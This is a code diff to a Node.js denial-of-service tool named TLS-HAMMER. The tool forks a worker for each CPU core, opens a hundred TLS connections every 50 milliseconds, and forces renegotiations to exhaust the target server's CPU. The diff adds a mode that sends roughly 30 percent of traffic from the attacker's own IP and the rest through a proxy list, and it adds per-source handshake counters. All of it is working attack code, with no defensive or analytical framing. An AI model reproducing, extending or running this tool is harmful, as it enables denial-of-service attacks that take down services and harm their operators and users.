@@ -1,6 +1,7 @@
 // R10-3: TLS-HAMMER - SSL/TLS Handshake Exhaustion
 // Focus: CPU burn on target (low local CPU)
 // Technique: Rapid TLS renegotiation + Session resumption
+// Updated: Mixed main IP + proxies
 
 const tls = require('tls');
 const net = require('net');
@@ -18,11 +19,16 @@ try {
         .filter(line => line && !line.startsWith('#') && line.includes(':'));
     console.log(`[R10-3] Loaded ${proxies.length} proxies`);
 } catch (e) {
-    console.log('[R10-3] No proxy.txt found, running without proxies');
+    console.log('[R10-3] No proxy.txt found, running with main IP only');
 }
+
+// Mix settings
+const USE_MAIN_IP = true;
+const MIX_RATIO = 0.3; // 30% main IP
 
 if (cluster.isMaster) {
     console.log(`[R10-3] TLS-HAMMER launching on ${CPU_CORES} cores`);
+    console.log(`[R10-3] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
     for (let i = 0; i < CPU_CORES; i++) cluster.fork();
     
     setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
@@ -32,14 +38,22 @@ if (cluster.isMaster) {
     startTLSHammer(target, time);
 }
 
+function shouldUseMainIp() {
+    return USE_MAIN_IP && Math.random() < MIX_RATIO;
+}
+
 function startTLSHammer(target, time) {
     const parsed = new URL(target);
     let handshakes = 0;
+    let mainIpCount = 0;
+    let proxyCount = 0;
     
     const interval = setInterval(() => {
         for (let i = 0; i < 100; i++) {
             try {
-                if (proxies.length > 0) {
+                const useMain = shouldUseMainIp();
+                
+                if (!useMain && proxies.length > 0) {
                     // Use proxy
                     const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                     const [proxyHost, proxyPort] = proxy.split(':');
@@ -58,6 +72,7 @@ function startTLSHammer(target, time) {
                             
                             tlsSocket.on('secureConnect', () => {
                                 handshakes++;
+                                proxyCount++;
                                 
                                 // Immediate renegotiation - CPU heavy on target
                                 if (Math.random() > 0.5) {
@@ -73,7 +88,7 @@ function startTLSHammer(target, time) {
                     
                     socket.on('error', () => {});
                 } else {
-                    // Direct connection
+                    // Direct connection (main IP)
                     const tlsSocket = tls.connect(443, parsed.hostname, {
                         rejectUnauthorized: false,
                         servername: parsed.hostname,
@@ -81,6 +96,7 @@ function startTLSHammer(target, time) {
                         secureProtocol: 'TLSv1_2_method'
                     }, () => {
                         handshakes++;
+                        mainIpCount++;
                         
                         if (Math.random() > 0.5) {
                             tlsSocket.renegotiate({}, (err) => {});
@@ -96,8 +112,10 @@ function startTLSHammer(target, time) {
     }, 50);
     
     setInterval(() => {
-        console.log(`[R10-3] Handshakes/sec: ${handshakes}`);
+        console.log(`[R10-3] Handshakes/sec: ${handshakes} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
         handshakes = 0;
+        mainIpCount = 0;
+        proxyCount = 0;
     }, 1000);
     
     setTimeout(() => {
